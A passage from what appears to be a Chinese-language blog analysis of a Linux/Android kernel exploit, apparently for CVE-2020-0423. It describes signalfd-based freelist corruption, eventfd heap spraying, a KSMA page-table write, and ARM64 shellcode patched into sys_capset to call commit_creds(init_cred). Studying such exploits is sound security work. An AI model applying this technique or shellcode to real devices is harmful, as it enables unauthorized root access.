	sigset_t sigmask;
	struct signalfd_ctx *ctx;

[...]
	if (sizemask != sizeof(sigset_t) ||
	    copy_from_user(&sigmask, user_mask, sizeof(sigmask)))
		return -EINVAL;
	sigdelsetmask(&sigmask, sigmask(SIGKILL) | sigmask(SIGSTOP));
	signotset(&sigmask);

	if (ufd == -1) {
		ctx = kmalloc(sizeof(*ctx), GFP_KERNEL);
		if (!ctx)
			return -ENOMEM;

		ctx->sigmask = sigmask;
        [...]

```

sigdelsetmask(&sigmask, sigmask(SIGKILL) | sigmask(SIGSTOP));signotset(&sigmask); 会导致在我们的值上 | 40100，因而我们不直接写上 swapper_pg_dir 地址，否则不会 malloc 到上面去, 因为地址变成了（swapper_pg_dir | 0x40100）  
![](https://img-blog.csdnimg.cn/7d68a7822d814763a61ca59c6fb9e576.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAMjAwMDBz,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

对此，作者想了别的方法

, 有点复杂

首先找了一个足够大的完全用 0 填充的内核内存区域（| 0x40100）还在其中，作者在这里选择了 ipa_testbus_mem ，0x198000 大小的缓冲区，利用被重叠的 signalfd 覆盖 free 的对象，修改 freelist 为

ipa_testbus_mem | 0x40100, 所以下次分配的地址为 ipa_testbus_mem | 0x40100

![](https://img-blog.csdnimg.cn/25674b9e0d42428697492b791e5ec749.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAMjAwMDBz,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

```
struct eventfd_ctx {
    struct kref kref;
    wait_queue_head_t wqh;
    /*
     * Every time that a write(2) is performed on an eventfd, the
     * value of the __u64 being written is added to "count" and a
     * wakeup is performed on "wqh". A read(2) will return the "count"
     * value to userspace, and will reset "count" to zero. The kernel
     * side eventfd_signal() also, adds to the "count" counter and
     * issue a wakeup.
     */
    __u64 count;
    unsigned int flags;
};

```

之后使用 eventfd_ctx 来堆喷，eventfd_ctx 的 count 我们是可以写入任意值 ，偏移为 0x20, 向 count 写入（swapper_pg_dir+ 0x1e0 *8）COUNT+0XB5F00 也就是我们需要填入 block descriptor 的地址

![](https://img-blog.csdnimg.cn/249e7be5efdb4ad7972b77d6866a511b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAMjAwMDBz,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

接着 free 掉所有的 eventfd, 重新利用重叠的 signalfd 设置 freelist 为 ipa_testbus_mem | 0x40100 + 0x20(count 的位置)，接着再次喷射 signalfd , 并写入 `0x00e8000080000751`，由此 ksma 攻击完成，我们可以修改任意 kernel code 和 kernel data 了

### 提权

这一步，是想怎么来就怎么来了，作者在这里 patch 掉 capset, 将它改为如下 shell code

```
uint64_t sys_capset_addr = base + 0x80000 + SYS_CAPSET;
uint64_t init_cred_addr = kaslr_leak + INIT_CRED;
uint64_t commit_creds_addr = kaslr_leak + COMMIT_CREDS;

uint32_t shellcode[] = {
    // commit_creds(init_cred)
    0x58000040, // ldr x0, .+8
    0x14000003, // b   .+12
    LO_DWORD(init_cred_addr),
    HI_DWORD(init_cred_addr),
    0x58000041, // ldr x1, .+8
    0x14000003, // b   .+12
    LO_DWORD(commit_creds_addr),
    HI_DWORD(commit_creds_addr),
    0xA9BF7BFD, // stp x29, x30, [sp, #-0x10]!
    0xD63F0020, // blr x1
    0xA8C17BFD, // ldp x29, x30, [sp], #0x10

    0x2A1F03E0, // mov w0, wzr
    0xD65F03C0, // ret
};

```

由此完成

参考
--

https://bbs.pediy.com/thread-264616.htm

https://www.longterm.io/cve-2020-0423.html